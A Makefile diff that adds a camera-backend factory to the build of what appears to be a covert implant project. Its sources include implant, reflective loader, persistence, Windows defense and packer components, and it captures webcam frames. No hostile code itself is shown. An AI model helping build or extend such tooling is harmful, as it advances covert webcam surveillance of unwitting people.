@@ -36,7 +36,12 @@ BUILD     := build/linux
 # 零开销。stdout 必须丢弃（否则混进变量值），stderr 保留。
 _PACKER_PREBUILD := $(shell $(MAKE) -C ../20_packer --no-print-directory >/dev/null)
 
-PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/implant.c src/defend_win.c \
+# cam_factory.c 提供统一的 cam_source_create / cam_source_destroy 并按 backend
+# 名字分发；cam_mock.c 与 cam_linux_v4l2.c 现在可以同时链接（此前两者都导出
+# cam_source_create，只能二选一，导致 Linux 真机无法在保留 mock 测试的前提下
+# 启用 V4L2）。
+PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/cam_factory.c \
+            src/cam_linux_v4l2.c src/implant.c src/defend_win.c \
             src/reflect_run.c
 PORT_OBJS := $(PORT_SRCS:src/%.c=$(BUILD)/%.o)
 
@@ -149,13 +154,15 @@ winshim-build:
 	$(SHIM_CXX) -x c++ -c ../17_loader/src/reflect.c -o $(SHIM_BUILD)/reflect.o
 	$(SHIM_CXX) -x c++ -c src/implant.c -o $(SHIM_BUILD)/implant.o
 	$(SHIM_CXX) -x c++ -c src/cam_jpeg.c -o $(SHIM_BUILD)/cam_jpeg.o
+	$(SHIM_CXX) -x c++ -c src/cam_factory.c -o $(SHIM_BUILD)/cam_factory.o
 	$(SHIM_CXX) -c tests/test_implant_main.cpp -o $(SHIM_BUILD)/test_implant_main.o
 	# 采集后端用 cam_mf.o（Windows 真实代码路径 + shim 假设备），而不是
-	# cam_mock.o：shim_impl 已提供 camera 层实现，两者同链会重复定义。
-	# 这样验证的是 Windows 采集路径本身能被主循环驱动。
+	# cam_mock.o：这样验证的是 Windows 采集路径本身能被主循环驱动。
+	# （分发层 cam_factory.o 已单独链入，见上。）
 	$(CXX) $(SHIM_BUILD)/implant_main.o $(SHIM_BUILD)/implant.o \
 	      $(SHIM_BUILD)/reflect_run.o $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
 	      $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
+	      $(SHIM_BUILD)/cam_factory.o \
 	      $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
 	      $(SHIM_BUILD)/test_implant_main.o -o $(SHIM_BUILD)/test_implant_main
 
